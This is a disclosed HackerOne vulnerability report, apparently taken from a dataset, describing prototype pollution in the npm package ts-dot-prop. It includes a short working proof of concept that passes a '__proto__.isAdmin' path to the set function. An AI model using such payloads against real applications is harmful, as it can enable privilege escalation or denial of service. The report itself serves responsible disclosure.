---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '980599'
original_report_id: '980599'
title: '[ts-dot-prop] Prototype Pollution'
team_handle: nodejs-ecosystem
created_at: '2020-09-12T10:23:58.881Z'
disclosed_at: '2020-10-29T19:25:11.075Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
---

# [ts-dot-prop] Prototype Pollution

## Metadata

- HackerOne Report ID: 980599
- Weakness: 
- Program: nodejs-ecosystem
- Disclosed At: 2020-10-29T19:25:11.075Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `Prototype Pollution` vulnerability in `ts-dot-prop`.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `ts-dot-prop`
**version:** `1.4.0`
**npm page:** `https://www.npmjs.com/package/ts-dot-prop`

## Module Description

TypeScript utility to transform nested objects using a dot notation path.

## Module Stats

Weekly downloads: `1028`

# Vulnerability

## Vulnerability Description

The `set` function can be used to `set` properties of the Object prototype. It fails to restrict access to prototypes of objects, allowing for modification of prototype behavior, which may allow obtaining sensitive information/DoS/RCE.

## Steps To Reproduce:

install `ts-dot-prop`:  `npm install ts-dot-prop`

Create an object with __proto__ property and pass it to the `set` function:

## POC: 
`const tsDot = require('ts-dot-prop');
var obj = {}
console.log("Before : " + obj.isAdmin);
tsDot.set(obj, '__proto__.isAdmin', true);
console.log("After : " + obj.isAdmin);`

# Output:
Before: undefined
After: true

## Supporting Material/References:

- Operating System: Windows 10
- NODEJS VERSION: v12.18.3
- NPM VERSION: v6.14.6

# Wrap up

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [Y]

## Impact

The impact depends on the application. In some cases, it is possible to obtain Sensitive Information, Denial of Service (DoS), Remote Code Execution, Property Injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
